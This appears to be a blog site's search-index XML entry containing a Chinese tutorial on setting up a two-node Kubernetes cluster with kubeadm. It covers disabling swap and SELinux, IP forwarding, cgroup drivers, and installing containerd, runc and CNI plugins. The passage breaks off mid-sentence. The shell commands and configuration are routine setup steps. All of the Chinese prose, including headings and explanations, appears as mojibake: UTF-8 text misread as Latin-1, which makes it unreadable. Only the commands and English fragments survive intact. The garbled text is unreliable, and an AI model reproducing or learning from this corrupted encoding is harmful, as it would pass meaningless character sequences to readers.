<?xml version="1.0" encoding="utf-8"?>
<search>
  
  
  
  <entry>
    <title>k8så­¦ä¹ (kubeadm)</title>
    <link href="/2025/04/28/k8s%E5%AD%A6%E4%B9%A0-kubeadm/"/>
    <url>/2025/04/28/k8s%E5%AD%A6%E4%B9%A0-kubeadm/</url>
    
    <content type="html"><![CDATA[<h1 id="å‰è¨€"><a href="#å‰è¨€" class="headerlink" title="å‰è¨€"></a>å‰è¨€</h1><p>æœ¬æ–‡æ¥å­¦ä¹ k8sçš„æ­å»ºï¼ŒåŸºäº<code>kubeadm</code>ï¼Œå¦‚æœä¸ä¼šk8sçš„å¯ä»¥å»çœ‹<a href="https://blog.tuyiisxp.top/2025/04/26/k8s%E5%AD%A6%E4%B9%A0(%E5%9F%BA%E4%BA%8Eminikube%E6%A8%A1%E6%8B%9F)/">k8såŸºç¡€</a>,ç¡®ä¿ç½‘ç»œç¯å¢ƒè‰¯å¥½</p><p>ç¯å¢ƒï¼š</p><table><thead><tr><th align="center">ç¯å¢ƒ</th><th>ä¸»æœºå</th><th>ip</th></tr></thead><tbody><tr><td align="center">Ubuntu22.04 TLS</td><td>k8s-master</td><td>192.168.136.130</td></tr><tr><td align="center">Ubuntu22.04 TLS</td><td>k8s-node</td><td>192.168.136.131</td></tr></tbody></table><h1 id="å‡†å¤‡å·¥ä½œ"><a href="#å‡†å¤‡å·¥ä½œ" class="headerlink" title="å‡†å¤‡å·¥ä½œ"></a>å‡†å¤‡å·¥ä½œ</h1><h2 id="ç®€è¿°"><a href="#ç®€è¿°" class="headerlink" title="ç®€è¿°"></a>ç®€è¿°</h2><ol><li>ç¡®ä¿æ¯ä¸ªæœºå™¨çš„ç½‘ç»œå½¼æ­¤å‡èƒ½ç›¸äº’è¿æ¥</li></ol><ul><li>vmè‡ªå®šä¹‰é€‚é…å™¨é€‰æ‹©åŒä¸€å¼ ç½‘å¡</li></ul><ol start="2"><li><p>ç¡®ä¿æ¯ä¸ªèŠ‚ç‚¹ä¸Š MAC åœ°å€å’Œ product_uuid çš„å”¯ä¸€æ€§<br>ä½¿ç”¨å‘½ä»¤ <code>ip link</code> æˆ– <code>ifconfig -a</code> æ¥è·å–ç½‘ç»œæ¥å£çš„ MAC åœ°å€<br>å¯ä»¥ä½¿ç”¨ <code>sudo cat /sys/class/dmi/id/product_uuid</code> å‘½ä»¤å¯¹ product_uuid æ ¡éªŒ</p></li><li><p>ç¡®ä¿6443ç«¯å£å¼€å¯(podæ²¡ä½¿ç”¨å…¶ä»–æ’ä»¶)</p><p>ä½¿ç”¨å‘½ä»¤<code>nc 127.0.0.1 6443 -zv -w 2</code>æ£€éªŒ</p></li><li><p>å…³é—­selinuxï¼Œç²¾ç®€å®‰è£…æ²¡æœ‰<br><code>sed -i &#39;s/enforcing/disabled/&#39; /etc/selinux/config </code> # æ°¸ä¹…<br><code>setenforce 0</code>  # ä¸´æ—¶</p></li><li><p>äº¤æ¢åˆ†åŒºçš„é…ç½®</p><p>kubelet çš„é»˜è®¤è¡Œä¸ºæ˜¯åœ¨èŠ‚ç‚¹ä¸Šæ£€æµ‹åˆ°äº¤æ¢å†…å­˜æ—¶æ— æ³•å¯åŠ¨ã€‚ è¿™æ„å‘³ç€è¦ä¹ˆç¦ç”¨äº¤æ¢ï¼ˆswapï¼‰åŠŸèƒ½ï¼Œè¦ä¹ˆè®© kubelet å®¹å¿äº¤æ¢</p><ul><li>è‹¥éœ€å…è®¸äº¤æ¢åˆ†åŒºï¼ˆswapï¼‰ï¼Œè¯·åœ¨ kubelet é…ç½®æ–‡ä»¶ä¸­æ·»åŠ  <code>failSwapOn: false</code>ï¼Œæˆ–é€šè¿‡å‘½ä»¤è¡Œå‚æ•°æŒ‡å®šã€‚ æ³¨æ„ï¼šå³ä½¿è®¾ç½®äº† <code>failSwapOn: false</code>ï¼Œå·¥ä½œè´Ÿè½½é»˜è®¤æƒ…å†µä¸‹ä»æ— æ³•è®¿é—®äº¤æ¢ç©ºé—´ã€‚ å¯ä»¥é€šè¿‡åœ¨ kubelet é…ç½®æ–‡ä»¶ä¸­è®¾ç½® <code>swapBehavior</code> æ¥ä¿®æ”¹æ­¤è®¾ç½®ã€‚è‹¥è¦ä½¿ç”¨äº¤æ¢ç©ºé—´ï¼Œ è¯·è®¾ç½® <code>swapBehavior</code> çš„å€¼ï¼Œè¿™ä¸ªå€¼ä¸èƒ½æ˜¯é»˜è®¤çš„ <code>NoSwap</code>ã€‚ æ›´å¤šç»†èŠ‚å‚é˜…<a href="https://kubernetes.io/zh-cn/docs/concepts/architecture/nodes/#swap-memory">äº¤æ¢å†…å­˜ç®¡ç†</a></li><li>è¦ç¦ç”¨äº¤æ¢åˆ†åŒºï¼ˆswapï¼‰ï¼Œå¯ä»¥ä½¿ç”¨å‘½ä»¤ <code>sudo swapoff -a</code> æš‚æ—¶å…³é—­äº¤æ¢åˆ†åŒºåŠŸèƒ½ã€‚ è¦ä½¿æ­¤æ›´æ”¹åœ¨é‡å¯åä»ç„¶ç”Ÿæ•ˆï¼Œè¯·ç¡®ä¿åœ¨ç³»ç»Ÿçš„é…ç½®æ–‡ä»¶ï¼ˆå¦‚ <code>/etc/fstab</code> æˆ– <code>systemd.swap</code>ï¼‰ä¸­ç¦ç”¨äº¤æ¢åŠŸèƒ½,Ubuntuä½¿ç”¨<code>sudo vim /etc/fstab</code>æŠŠ<code>/swapfile</code>å¼€å¤´çš„è¡Œæ³¨é‡Šæ‰ï¼Œå†é‡å¯<code>sudo reboot</code></li></ul></li><li><p>å®‰è£…container runtime</p><ul><li>Kubernetes ä½¿ç”¨<a href="https://kubernetes.io/zh-cn/docs/concepts/architecture/cri">å®¹å™¨è¿è¡Œæ—¶æ¥å£ï¼ˆContainer Runtime Interfaceï¼ŒCRIï¼‰</a> æ¥ä¸ä½ æ‰€é€‰æ‹©çš„å®¹å™¨è¿è¡Œæ—¶äº¤äº’</li><li>Docker Engine æ²¡æœ‰å®ç° <a href="https://kubernetes.io/zh-cn/docs/concepts/architecture/cri/">CRI</a>ï¼Œè‹¥è¦ä½¿ç”¨dockeréœ€è¦é¢å¤–å®‰è£… <a href="https://github.com/Mirantis/cri-dockerd">cri-dockerd</a>ï¼Œä½†æ˜¯å®ƒåœ¨ 1.24 ç‰ˆæœ¬ä» kubelet ä¸­<a href="https://kubernetes.io/zh-cn/dockershim">ç§»é™¤</a>ï¼Œå¯èƒ½é¢ä¸´å¾ˆå¤šå…¼å®¹é—®é¢˜</li></ul></li><li><p>å®‰è£… kubeadmã€kubelet å’Œ kubectl</p></li></ol><h2 id="å®‰è£…container-runtime"><a href="#å®‰è£…container-runtime" class="headerlink" title="å®‰è£…container runtime"></a>å®‰è£…container runtime</h2><h3 id="å®‰è£…å’Œé…ç½®å…ˆå†³æ¡ä»¶åŠå‰ç½®çŸ¥è¯†"><a href="#å®‰è£…å’Œé…ç½®å…ˆå†³æ¡ä»¶åŠå‰ç½®çŸ¥è¯†" class="headerlink" title="å®‰è£…å’Œé…ç½®å…ˆå†³æ¡ä»¶åŠå‰ç½®çŸ¥è¯†"></a>å®‰è£…å’Œé…ç½®å…ˆå†³æ¡ä»¶åŠå‰ç½®çŸ¥è¯†</h3><p>é»˜è®¤æƒ…å†µä¸‹ï¼ŒLinux å†…æ ¸ä¸å…è®¸ IPv4 æ•°æ®åŒ…åœ¨æ¥å£ä¹‹é—´è·¯ç”±ã€‚ å¤§å¤šæ•° Kubernetes é›†ç¾¤ç½‘ç»œå®ç°éƒ½ä¼šæ›´æ”¹æ­¤è®¾ç½®</p><p>æ‰‹åŠ¨å¯ç”¨ IPv4 æ•°æ®åŒ…è½¬å‘ï¼š</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-comment"># è®¾ç½®æ‰€éœ€çš„ sysctl å‚æ•°ï¼Œå‚æ•°åœ¨é‡æ–°å¯åŠ¨åä¿æŒä¸å˜</span><br><span class="hljs-built_in">cat</span> &lt;&lt;<span class="hljs-string">EOF | sudo tee /etc/sysctl.d/k8s.conf</span><br><span class="hljs-string">net.ipv4.ip_forward = 1</span><br><span class="hljs-string">EOF</span><br><br><span class="hljs-comment"># åº”ç”¨ sysctl å‚æ•°è€Œä¸é‡æ–°å¯åŠ¨</span><br><span class="hljs-built_in">sudo</span> sysctl --system<br></code></pre></td></tr></table></figure><p>ä½¿ç”¨ä»¥ä¸‹å‘½ä»¤éªŒè¯ <code>net.ipv4.ip_forward</code> æ˜¯å¦è®¾ç½®ä¸º 1ï¼š</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">sysctl net.ipv4.ip_forward<br></code></pre></td></tr></table></figure><h4 id="cgroup-é©±åŠ¨"><a href="#cgroup-é©±åŠ¨" class="headerlink" title="cgroup é©±åŠ¨ "></a>cgroup é©±åŠ¨<a href="https://kubernetes.io/zh-cn/docs/setup/production-environment/container-runtimes/#cgroup-drivers"> </a></h4><p><a href="https://kubernetes.io/zh-cn/docs/reference/generated/kubelet">kubelet</a> å’Œåº•å±‚å®¹å™¨è¿è¡Œæ—¶éƒ½éœ€è¦å¯¹æ¥æ§åˆ¶ç»„æ¥å¼ºåˆ¶æ‰§è¡Œ <a href="https://kubernetes.io/zh-cn/docs/concepts/configuration/manage-resources-containers/">ä¸º Pod å’Œå®¹å™¨ç®¡ç†èµ„æº</a> å¹¶ä¸ºè¯¸å¦‚ CPUã€å†…å­˜è¿™ç±»èµ„æºè®¾ç½®è¯·æ±‚å’Œé™åˆ¶ã€‚è‹¥è¦å¯¹æ¥æ§åˆ¶ç»„ï¼Œkubelet å’Œå®¹å™¨è¿è¡Œæ—¶éœ€è¦ä½¿ç”¨ä¸€ä¸ª <strong>cgroup é©±åŠ¨</strong>ã€‚ å…³é”®çš„ä¸€ç‚¹æ˜¯ kubelet å’Œå®¹å™¨è¿è¡Œæ—¶éœ€ä½¿ç”¨ç›¸åŒçš„ cgroup é©±åŠ¨å¹¶ä¸”é‡‡ç”¨ç›¸åŒçš„é…ç½®ã€‚</p><p>å¯ç”¨çš„ cgroup é©±åŠ¨æœ‰ä¸¤ä¸ªï¼š</p><ul><li><code>cgroupfs</code></li><li><code>systemd</code></li></ul><h4 id="cgroupfs-é©±åŠ¨"><a href="#cgroupfs-é©±åŠ¨" class="headerlink" title="cgroupfs é©±åŠ¨"></a>cgroupfs é©±åŠ¨</h4><p><code>cgroupfs</code> é©±åŠ¨æ˜¯ <a href="https://kubernetes.io/zh-cn/docs/reference/config-api/kubelet-config.v1beta1">kubelet ä¸­é»˜è®¤çš„ cgroup é©±åŠ¨</a>ã€‚ å½“ä½¿ç”¨ <code>cgroupfs</code> é©±åŠ¨æ—¶ï¼Œ kubelet å’Œå®¹å™¨è¿è¡Œæ—¶å°†ç›´æ¥å¯¹æ¥ cgroup æ–‡ä»¶ç³»ç»Ÿæ¥é…ç½® cgroupã€‚</p><p>å½“ <a href="https://www.freedesktop.org/wiki/Software/systemd/">systemd</a> æ˜¯åˆå§‹åŒ–ç³»ç»Ÿæ—¶ï¼Œ <strong>ä¸</strong> æ¨èä½¿ç”¨ <code>cgroupfs</code> é©±åŠ¨ï¼Œå› ä¸º systemd æœŸæœ›ç³»ç»Ÿä¸Šåªæœ‰ä¸€ä¸ª cgroup ç®¡ç†å™¨ã€‚ æ­¤å¤–ï¼Œå¦‚æœä½ ä½¿ç”¨ <a href="https://kubernetes.io/zh-cn/docs/concepts/architecture/cgroups">cgroup v2</a>ï¼Œ åˆ™åº”ç”¨ <code>systemd</code> cgroup é©±åŠ¨å–ä»£ <code>cgroupfs</code>ã€‚æ‰€æœ‰<code>Ubuntu</code>ç³»ç»Ÿå»ºè®®ä½¿ç”¨<code>systemd</code>é©±åŠ¨<code>cgroup</code></p><h4 id="systemd-cgroup-é©±åŠ¨"><a href="#systemd-cgroup-é©±åŠ¨" class="headerlink" title="systemd cgroup é©±åŠ¨"></a>systemd cgroup é©±åŠ¨</h4><p>å½“æŸä¸ª Linux ç³»ç»Ÿå‘è¡Œç‰ˆä½¿ç”¨ <a href="https://www.freedesktop.org/wiki/Software/systemd/">systemd</a> ä½œä¸ºå…¶åˆå§‹åŒ–ç³»ç»Ÿæ—¶ï¼Œåˆå§‹åŒ–è¿›ç¨‹ä¼šç”Ÿæˆå¹¶ä½¿ç”¨ä¸€ä¸ª root æ§åˆ¶ç»„ï¼ˆ<code>cgroup</code>ï¼‰ï¼Œå¹¶å……å½“ cgroup ç®¡ç†å™¨ã€‚</p><p>systemd ä¸ cgroup é›†æˆç´§å¯†ï¼Œå¹¶å°†ä¸ºæ¯ä¸ª systemd å•å…ƒåˆ†é…ä¸€ä¸ª cgroupã€‚ å› æ­¤ï¼Œå¦‚æœä½  <code>systemd</code> ç”¨ä½œåˆå§‹åŒ–ç³»ç»Ÿï¼ŒåŒæ—¶ä½¿ç”¨ <code>cgroupfs</code> é©±åŠ¨ï¼Œåˆ™ç³»ç»Ÿä¸­ä¼šå­˜åœ¨ä¸¤ä¸ªä¸åŒçš„ cgroup ç®¡ç†å™¨ã€‚</p><p>åŒæ—¶å­˜åœ¨ä¸¤ä¸ª cgroup ç®¡ç†å™¨å°†é€ æˆç³»ç»Ÿä¸­é’ˆå¯¹å¯ç”¨çš„èµ„æºå’Œä½¿ç”¨ä¸­çš„èµ„æºå‡ºç°ä¸¤ä¸ªè§†å›¾ã€‚æŸäº›æƒ…å†µä¸‹ï¼Œ å°† kubelet å’Œå®¹å™¨è¿è¡Œæ—¶é…ç½®ä¸ºä½¿ç”¨ <code>cgroupfs</code>ã€ä½†ä¸ºå‰©ä½™çš„è¿›ç¨‹ä½¿ç”¨ <code>systemd</code> çš„é‚£äº›èŠ‚ç‚¹å°†åœ¨èµ„æºå‹åŠ›å¢å¤§æ—¶å˜å¾—ä¸ç¨³å®šã€‚</p><p>å½“ systemd æ˜¯é€‰å®šçš„åˆå§‹åŒ–ç³»ç»Ÿæ—¶ï¼Œç¼“è§£è¿™ä¸ªä¸ç¨³å®šé—®é¢˜çš„æ–¹æ³•æ˜¯é’ˆå¯¹ kubelet å’Œå®¹å™¨è¿è¡Œæ—¶å°† <code>systemd</code> ç”¨ä½œ cgroup é©±åŠ¨ã€‚</p><p>è¦å°† <code>systemd</code> è®¾ç½®ä¸º cgroup é©±åŠ¨ï¼Œéœ€ç¼–è¾‘ <a href="https://kubernetes.io/zh-cn/docs/tasks/administer-cluster/kubelet-config-file/"><code>KubeletConfiguration</code></a> çš„ <code>cgroupDriver</code> é€‰é¡¹ï¼Œå¹¶å°†å…¶è®¾ç½®ä¸º <code>systemd</code>ã€‚ä¾‹å¦‚ï¼š</p><figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs yaml"><span class="hljs-attr">apiVersion:</span> <span class="hljs-string">kubelet.config.k8s.io/v1beta1</span><br><span class="hljs-attr">kind:</span> <span class="hljs-string">KubeletConfiguration</span><br><span class="hljs-string">...</span><br><span class="hljs-attr">cgroupDriver:</span> <span class="hljs-string">systemd</span><br></code></pre></td></tr></table></figure><blockquote><p>è¯´æ˜ï¼š<br>ä» v1.22 å¼€å§‹ï¼Œåœ¨ä½¿ç”¨ kubeadm åˆ›å»ºé›†ç¾¤æ—¶ï¼Œå¦‚æœç”¨æˆ·æ²¡æœ‰åœ¨ <code>KubeletConfiguration</code> ä¸‹è®¾ç½® <code>cgroupDriver</code> å­—æ®µï¼Œkubeadm é»˜è®¤ä½¿ç”¨ <code>systemd</code>ã€‚</p></blockquote><p><strong>å¦‚æœä½ å°† <code>systemd</code> é…ç½®ä¸º kubelet çš„ cgroup é©±åŠ¨ï¼Œä½ ä¹Ÿå¿…é¡»å°† <code>systemd</code> é…ç½®ä¸ºå®¹å™¨è¿è¡Œæ—¶çš„ cgroup é©±åŠ¨ã€‚ä¾‹å¦‚ï¼š</strong></p><ul><li>containerd</li><li>CRI-O</li></ul><p>åœ¨ Kubernetes 1.33 ä¸­ï¼Œå¯ç”¨ <code>KubeletCgroupDriverFromCRI</code> <a href="https://kubernetes.io/zh-cn/docs/reference/command-line-tools-reference/feature-gates/">ç‰¹æ€§é—¨æ§</a>ç»“åˆæ”¯æŒ <code>RuntimeConfig</code> CRI RPC çš„å®¹å™¨è¿è¡Œæ—¶ï¼Œkubelet ä¼šè‡ªåŠ¨ä»è¿è¡Œæ—¶æ£€æµ‹é€‚å½“çš„ Cgroup é©±åŠ¨ç¨‹åºï¼Œå¹¶å¿½ç•¥ kubelet é…ç½®ä¸­çš„ <code>cgroupDriver</code> è®¾ç½®ã€‚</p><blockquote><h4 id="æ³¨æ„ï¼š"><a href="#æ³¨æ„ï¼š" class="headerlink" title="æ³¨æ„ï¼š"></a>æ³¨æ„ï¼š</h4><p>æ³¨æ„ï¼šæ›´æ”¹å·²åŠ å…¥é›†ç¾¤çš„èŠ‚ç‚¹çš„ cgroup é©±åŠ¨æ˜¯ä¸€é¡¹æ•æ„Ÿçš„æ“ä½œã€‚ å¦‚æœ kubelet å·²ç»ä½¿ç”¨æŸ cgroup é©±åŠ¨çš„è¯­ä¹‰åˆ›å»ºäº† Podï¼Œæ›´æ”¹è¿è¡Œæ—¶ä»¥ä½¿ç”¨åˆ«çš„ cgroup é©±åŠ¨ï¼Œå½“ä¸ºç°æœ‰ Pod é‡æ–°åˆ›å»º PodSandbox æ—¶ä¼šäº§ç”Ÿé”™è¯¯ã€‚ é‡å¯ kubelet ä¹Ÿå¯èƒ½æ— æ³•è§£å†³æ­¤ç±»é—®é¢˜ã€‚</p><p>å¦‚æœä½ æœ‰åˆ‡å®å¯è¡Œçš„è‡ªåŠ¨åŒ–æ–¹æ¡ˆï¼Œä½¿ç”¨å…¶ä»–å·²æ›´æ–°é…ç½®çš„èŠ‚ç‚¹æ¥æ›¿æ¢è¯¥èŠ‚ç‚¹ï¼Œ æˆ–è€…ä½¿ç”¨è‡ªåŠ¨åŒ–æ–¹æ¡ˆæ¥é‡æ–°å®‰è£…ã€‚</p></blockquote><h4 id="å°†-kubeadm-ç®¡ç†çš„é›†ç¾¤è¿ç§»åˆ°-systemd-é©±åŠ¨"><a href="#å°†-kubeadm-ç®¡ç†çš„é›†ç¾¤è¿ç§»åˆ°-systemd-é©±åŠ¨" class="headerlink" title="å°† kubeadm ç®¡ç†çš„é›†ç¾¤è¿ç§»åˆ° systemd é©±åŠ¨"></a>å°† kubeadm ç®¡ç†çš„é›†ç¾¤è¿ç§»åˆ° <code>systemd</code> é©±åŠ¨</h4><p>å¦‚æœä½ å¸Œæœ›å°†ç°æœ‰çš„ç”± kubeadm ç®¡ç†çš„é›†ç¾¤è¿ç§»åˆ° <code>systemd</code> cgroup é©±åŠ¨ è¯·æŒ‰ç…§<a href="https://kubernetes.io/zh-cn/docs/tasks/administer-cluster/kubeadm/configure-cgroup-driver/">é…ç½® cgroup é©±åŠ¨</a>æ“ä½œã€‚</p><h4 id="CRI-ç‰ˆæœ¬æ”¯æŒ"><a href="#CRI-ç‰ˆæœ¬æ”¯æŒ" class="headerlink" title="CRI ç‰ˆæœ¬æ”¯æŒ"></a>CRI ç‰ˆæœ¬æ”¯æŒ</h4><p>ä½ çš„å®¹å™¨è¿è¡Œæ—¶å¿…é¡»è‡³å°‘æ”¯æŒ v1alpha2 ç‰ˆæœ¬çš„å®¹å™¨è¿è¡Œæ—¶æ¥å£ã€‚</p><p>Kubernetes <a href="https://kubernetes.io/blog/2022/11/18/upcoming-changes-in-kubernetes-1-26/#cri-api-removal">ä» 1.26 ç‰ˆæœ¬å¼€å§‹</a><strong>ä»…é€‚ç”¨äº</strong> v1 ç‰ˆæœ¬çš„å®¹å™¨è¿è¡Œæ—¶ï¼ˆCRIï¼‰APIã€‚æ—©æœŸç‰ˆæœ¬é»˜è®¤ä¸º v1 ç‰ˆæœ¬ï¼Œ ä½†æ˜¯å¦‚æœå®¹å™¨è¿è¡Œæ—¶ä¸æ”¯æŒ v1 ç‰ˆæœ¬çš„ APIï¼Œ åˆ™ kubelet ä¼šå›é€€åˆ°ä½¿ç”¨ï¼ˆå·²å¼ƒç”¨çš„ï¼‰v1alpha2 ç‰ˆæœ¬çš„ API</p><h3 id="å®‰è£…containerd-ä»å®˜æ–¹äºŒè¿›åˆ¶å®‰è£…"><a href="#å®‰è£…containerd-ä»å®˜æ–¹äºŒè¿›åˆ¶å®‰è£…" class="headerlink" title="å®‰è£…containerd(ä»å®˜æ–¹äºŒè¿›åˆ¶å®‰è£…)"></a>å®‰è£…containerd(ä»å®˜æ–¹äºŒè¿›åˆ¶å®‰è£…)</h3><h4 id="ç¬¬-1-æ­¥ï¼šå®‰è£…-containerd"><a href="#ç¬¬-1-æ­¥ï¼šå®‰è£…-containerd" class="headerlink" title="ç¬¬ 1 æ­¥ï¼šå®‰è£… containerd"></a>ç¬¬ 1 æ­¥ï¼šå®‰è£… containerd</h4><p>ä» <a href="https://github.com/containerd/containerd/releases">https://github.com/containerd/containerd/releases</a> ä¸‹è½½ <code>containerd-&lt;VERSION&gt;-&lt;OS&gt;-&lt;ARCH&gt;.tar.gz</code> æ¡£æ¡ˆåº“ï¼ŒéªŒè¯å…¶ sha256sumï¼Œå¹¶å°†å…¶è§£å‹åˆ° <code>/usr/local</code> ç›®å½•ï¼š</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs bash">$ tar Cxzvf /usr/local containerd-1.6.2-linux-amd64.tar.gz<br>bin/<br>bin/containerd-shim-runc-v2<br>bin/containerd-shim<br>bin/ctr<br>bin/containerd-shim-runc-v1<br>bin/containerd<br>bin/containerd-stress<br></code></pre></td></tr></table></figure><p><code>containerd</code> äºŒè¿›åˆ¶æ–‡ä»¶æ˜¯ä¸ºåŸºäº glibc çš„ Linux å‘è¡Œç‰ˆï¼ˆå¦‚ Ubuntu å’Œ Rocky Linuxï¼‰åŠ¨æ€æ„å»ºçš„ã€‚æ­¤äºŒè¿›åˆ¶æ–‡ä»¶å¯èƒ½ä¸é€‚ç”¨äºåŸºäº musl çš„å‘è¡Œç‰ˆï¼Œä¾‹å¦‚ Alpine Linuxã€‚æ­¤ç±»å‘è¡Œç‰ˆçš„ç”¨æˆ·å¯èƒ½å¿…é¡»ä»æºæˆ–ç¬¬ä¸‰æ–¹è½¯ä»¶åŒ…å®‰è£… containerdã€‚</p><p>systemd ç³»ç»Ÿ</p><p>å¦‚æœæ‚¨æ‰“ç®—é€šè¿‡ systemd å¯åŠ¨ containerdï¼Œæ‚¨è¿˜åº”è¯¥ä»<code>https://raw.githubusercontent.com/containerd/containerd/main/containerd.service</code>è¿›å…¥ <code>/usr/local/lib/systemd/system/containerd.service</code> ï¼Œç„¶åè¿è¡Œ</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs bash">wget https://raw.githubusercontent.com/containerd/containerd/main/containerd.service<br><span class="hljs-comment">#ä»containerdå®˜æ–¹ä»“åº“å®‰è£…</span><br><span class="hljs-built_in">sudo</span> <span class="hljs-built_in">mv</span> containerd.service /etc/systemd/system/<br><span class="hljs-comment">#æŠŠåˆšæ‰ä¸‹è½½çš„æœåŠ¡æ–‡ä»¶ç§»åˆ° /etc/systemd/system/ ç›®å½•ï¼Œè¿™æ˜¯ç³»ç»Ÿçº§æœåŠ¡çš„æ ‡å‡†å®‰è£…ä½ç½®</span><br><span class="hljs-built_in">sudo</span> systemctl daemon-reexec<br><span class="hljs-comment">#é‡æ‰§è¡Œ systemd æœ¬èº«</span><br><span class="hljs-built_in">sudo</span> systemctl daemon-reload<br><span class="hljs-comment">#é‡æ–°åŠ è½½ systemd çš„æœåŠ¡é…ç½®</span><br><span class="hljs-built_in">sudo</span> systemctl <span class="hljs-built_in">enable</span> --now containerd<br><span class="hljs-comment">#å¯ç”¨å¹¶ç«‹å³å¯åŠ¨ containerd æœåŠ¡</span><br><br><span class="hljs-comment">#å®‰è£…å®Œæˆè¿è¡Œæ£€éªŒ</span><br>containerd --version<br>ctr version<br>systemctl status containerd<br></code></pre></td></tr></table></figure><h4 id="ç¬¬-2-æ­¥ï¼šå®‰è£…-runc"><a href="#ç¬¬-2-æ­¥ï¼šå®‰è£…-runc" class="headerlink" title="ç¬¬ 2 æ­¥ï¼šå®‰è£… runc"></a>ç¬¬ 2 æ­¥ï¼šå®‰è£… runc</h4><p>ä» <a href="https://github.com/opencontainers/runc/releases">https://github.com/opencontainers/runc/releases</a> ä¸‹è½½ <code>runc.&lt;ARCH&gt;</code> äºŒè¿›åˆ¶æ–‡ä»¶ï¼ŒéªŒè¯å…¶ sha256sumï¼Œå¹¶å°†å…¶å®‰è£…ä¸º <code>/usr/local/sbin/runc</code>ã€‚</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs bash">wget https://github.com/opencontainers/runc/releases/download/v1.3.0-rc.2/runc.amd64<br><br><span class="hljs-built_in">sudo</span> install -m 755 runc.amd64 /usr/local/sbin/runc<br><span class="hljs-comment">#å®‰è£…runc</span><br></code></pre></td></tr></table></figure><p>äºŒè¿›åˆ¶æ–‡ä»¶æ˜¯é™æ€æ„å»ºçš„ï¼Œåº”è¯¥å¯ä»¥åœ¨ä»»ä½• Linux å‘è¡Œç‰ˆä¸Šè¿è¡Œã€‚</p><h4 id="ç¬¬-3-æ­¥ï¼šå®‰è£…-CNI-æ’ä»¶æ‰§è¡Œæ–‡ä»¶"><a href="#ç¬¬-3-æ­¥ï¼šå®‰è£…-CNI-æ’ä»¶æ‰§è¡Œæ–‡ä»¶" class="headerlink" title="ç¬¬ 3 æ­¥ï¼šå®‰è£… CNI æ’ä»¶æ‰§è¡Œæ–‡ä»¶"></a>ç¬¬ 3 æ­¥ï¼šå®‰è£… CNI æ’ä»¶æ‰§è¡Œæ–‡ä»¶</h4><p>ä» <a href="https://github.com/containernetworking/plugins/releases">https://github.com/containernetworking/plugins/releases</a> ä¸‹è½½ <code>cni-plugins-&lt;OS&gt;-&lt;ARCH&gt;-&lt;VERSION&gt;.tgz</code> å­˜æ¡£ï¼ŒéªŒè¯å…¶ sha256sumï¼Œå¹¶å°†å…¶è§£å‹åˆ° <code>/opt/cni/bin</code> ä¸‹ï¼š</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs bash">wget https://github.com/containernetworking/plugins/releases/download/v1.7.1/cni-plugins-linux-amd64-v1.7.1.tgz<br>$ <span class="hljs-built_in">mkdir</span> -p /opt/cni/bin<br>$ tar Cxzvf /opt/cni/bin cni-plugins-linux-amd64-v1.7.1.tgz<br>./<br>./macvlan<br>./static<br>./vlan<br>./portmap<br>./host-local<br>./vrf<br>./bridge<br>./tuning<br>./firewall<br>./host-device<br>./sbr<br>./loopback<br>./dhcp<br>./ptp<br>./ipvlan<br>./bandwidth<br></code></pre></td></tr></table></figure><p>äºŒè¿›åˆ¶æ–‡ä»¶æ˜¯é™æ€æ„å»ºçš„ï¼Œåº”è¯¥å¯ä»¥åœ¨ä»»ä½• Linux å‘è¡Œç‰ˆä¸Šè¿è¡Œã€‚</p><h2 id="å®‰è£…-kubeadmã€kubelet-å’Œ-kubectl"><a href="#å®‰è£…-kubeadmã€kubelet-å’Œ-kubectl" class="headerlink" title="å®‰è£… kubeadmã€kubelet å’Œ kubectl"></a>å®‰è£… kubeadmã€kubelet å’Œ kubectl</h2><p>ä½ éœ€è¦åœ¨æ¯å°æœºå™¨ä¸Šå®‰è£…ä»¥ä¸‹çš„è½¯ä»¶åŒ…ï¼š</p><ul><li><code>kubeadm</code>ï¼šç”¨æ¥åˆå§‹åŒ–é›†ç¾¤çš„æŒ‡ä»¤ã€‚</li><li><code>kubelet</code>ï¼šåœ¨é›†ç¾¤ä¸­çš„æ¯ä¸ªèŠ‚ç‚¹ä¸Šç”¨æ¥å¯åŠ¨ Pod å’Œå®¹å™¨ç­‰ã€‚</li><li><code>kubectl</code>ï¼šç”¨æ¥ä¸é›†ç¾¤é€šä¿¡çš„å‘½ä»¤è¡Œå·¥å…·ã€‚</li></ul><p>kubeadm <strong>ä¸èƒ½</strong>å¸®ä½ å®‰è£…æˆ–è€…ç®¡ç† <code>kubelet</code> æˆ– <code>kubectl</code>ï¼Œ æ‰€ä»¥ä½ éœ€è¦ç¡®ä¿å®ƒä»¬ä¸é€šè¿‡ kubeadm 